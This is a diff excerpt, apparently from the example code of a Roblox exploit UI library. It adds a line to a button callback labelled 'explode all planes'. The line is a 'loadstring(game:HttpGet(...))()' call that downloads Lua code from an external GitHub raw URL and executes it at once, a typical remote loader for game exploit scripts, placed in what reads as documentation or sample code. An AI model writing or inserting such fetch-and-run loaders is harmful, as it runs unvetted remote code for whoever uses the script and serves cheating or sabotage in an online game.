@@ -329,6 +329,7 @@ Name = <string> - The name of the section.
 Tab:AddButton({
 	Name = "explode all planes 💥",
 	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/raimbowo1/test/main/naval"))()
       		print("button pressed")
   	end    
 })
